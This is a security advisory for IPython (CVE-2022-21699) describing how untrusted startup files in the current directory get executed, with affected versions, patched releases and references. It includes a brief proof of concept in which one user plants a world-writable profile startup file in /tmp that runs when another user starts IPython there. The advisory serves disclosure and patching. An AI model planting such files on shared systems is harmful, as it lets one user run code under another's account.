# [H] Execution with Unnecessary Privileges in ipython

## Summary
Severity: High
Advisory: GHSA-pq7m-3gw7-gq5x
CVE: CVE-2022-21699
CWE: CWE-250, CWE-269, CWE-279
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2022-01-21
Source: https://github.com/advisories/GHSA-pq7m-3gw7-gq5x
Type: github-advisory

## Affected
- PyPI: `ipython` — affected >=0 <5.11
- PyPI: `ipython` — affected >=6.0.0 <7.16.3
- PyPI: `ipython` — affected >=7.17.0 <7.31.1
- PyPI: `ipython` — affected >=8.0.0 <8.0.1

## Details
We’d like to disclose an arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another.
 
Proof of concept

User1:
```
mkdir -m 777 /tmp/profile_default
mkdir -m 777 /tmp/profile_default/startup
echo 'print("stealing your private secrets")' > /tmp/profile_default/startup/foo.py
```

User2:
```
cd /tmp
ipython
```

 

User2 will see:
```
Python 3.9.7 (default, Oct 25 2021, 01:04:21)
Type 'copyright', 'credits' or 'license' for more information
IPython 7.29.0 -- An enhanced Interactive Python. Type '?' for help.
stealing your private secrets
```


## Patched release and documentation

See https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699, 

Version 8.0.1, 7.31.1 for current Python version are recommended. 
Version 7.16.3 has also been published for Python 3.6 users, 
Version 5.11 (source only, 5.x branch on github) for older Python versions.

## References
- https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x
- https://nvd.nist.gov/vuln/detail/CVE-2022-21699
- https://github.com/ipython/ipython/commit/46a51ed69cdf41b4333943d9ceeb945c4ede5668
- https://github.com/ipython/ipython/commit/5fa1e409d2dc126c456510c16ece18e08b524e5b
- https://github.com/ipython/ipython/commit/67ca2b3aa9039438e6f80e3fccca556f26100b4d
- https://github.com/ipython/ipython/commit/a06ca837273271b4acb82c29be97c0b6d12a30ea
- https://github.com/ipython/ipython
- https://github.com/pypa/advisory-database/tree/main/vulns/ipython/PYSEC-2022-12.yaml
- https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699
- https://lists.debian.org/debian-lts-announce/2022/01/msg00021.html
- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/CRQRTWHYXMLDJ572VGVUZMUPEOTPM3KB
- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DZ7LVZBB4D7KVSFNEQUBEHFO3JW6D2ZK
